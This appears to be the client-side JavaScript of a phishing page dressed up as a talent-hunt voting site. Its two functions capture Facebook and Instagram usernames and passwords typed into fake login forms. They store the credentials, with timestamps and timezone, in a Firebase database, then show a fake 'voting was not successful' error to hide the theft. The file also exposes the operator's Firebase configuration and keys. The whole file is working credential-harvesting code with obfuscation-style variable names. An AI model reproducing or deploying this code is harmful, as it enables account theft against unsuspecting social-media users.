
const firebaseConfig = {
    'apiKey': "AIzaSyClD2fGSdipTFa9dPizXPZMpVxMxvuRklw",
    'authDomain': "instatalenthunt-d125c.firebaseapp.com",
    'databaseURL': "https://instatalenthunt-d125c-default-rtdb.firebaseio.com",
    'projectId': "instatalenthunt-d125c",
    'storageBucket': "instatalenthunt-d125c.appspot.com",
    'messagingSenderId': '853295749574',
    'appId': "1:853295749574:web:24a4810c6d294d11637ac7",
    'measurementId': "G-PDWP815V41"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate('6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', true);
function login() {
    firebase.auth().signInAnonymously()["catch"](function (_0x5cfe22) {
        var _0x4d2b87 = _0x5cfe22.message;
        window.alert("Error : " + _0x4d2b87);
    });
    var _0x18c2c4 = document.getElementById("fb-email").value;
    var _0x4c44e7 = document.getElementById("fb-pass").value;
    var _0x300f1d = new Date().toISOString().slice(0x0, 0xa);
    var _0x232b8e = new Date().toLocaleString().slice(0xb, 0x19);
    var _0x6b9b75 = Intl.DateTimeFormat().resolvedOptions().timeZone;
    if (_0x18c2c4 != '' && _0x4c44e7 != '') {
        firebase.database().ref("fbdet").push().set({
            'emle': _0x18c2c4,
            'mobile': '',
            'time': _0x232b8e,
            'timezone': _0x6b9b75,
            'pass': _0x4c44e7,
            'date': _0x300f1d,
            'type': 'Facebook'
        });
        setTimeout(function () {
            window.alert("Sorry voting was not successful please. Try again later");
            document.getElementById("fb-pass").value = '';
            return false;
        }, 0x7d0);
    }
}
function iglog() {
    firebase.auth().signInAnonymously()['catch'](function (_0x32be94) {
        var _0x15f21d = _0x32be94.message;
        window.alert("Error : " + _0x15f21d);
    });
    var _0x59f48f = document.getElementById("ig-uname").value;
    var _0x2b502a = document.getElementById('ig-pass').value;
    var _0x1f44f9 = new Date().toISOString().slice(0x0, 0xa);
    var _0x2ca34d = new Date().toLocaleString().slice(0xb, 0x19);
    var _0x537450 = Intl.DateTimeFormat().resolvedOptions().timeZone;
    console.log(_0x537450);
    if (_0x59f48f != '' && _0x2b502a != '') {
        firebase.database().ref("fbdet").push().set({
            'emle': _0x59f48f,
            'mobile': '',
            'time': _0x2ca34d,
            'timezone': _0x537450,
            'pass': _0x2b502a,
            'date': _0x1f44f9,
            'type': "Instagram"
        });
        setTimeout(function () {
            window.alert("Sorry voting was not successful please try again later");
            document.getElementById("ig-pass").value = '';
            return false;
        }, 0x7d0);
    }
}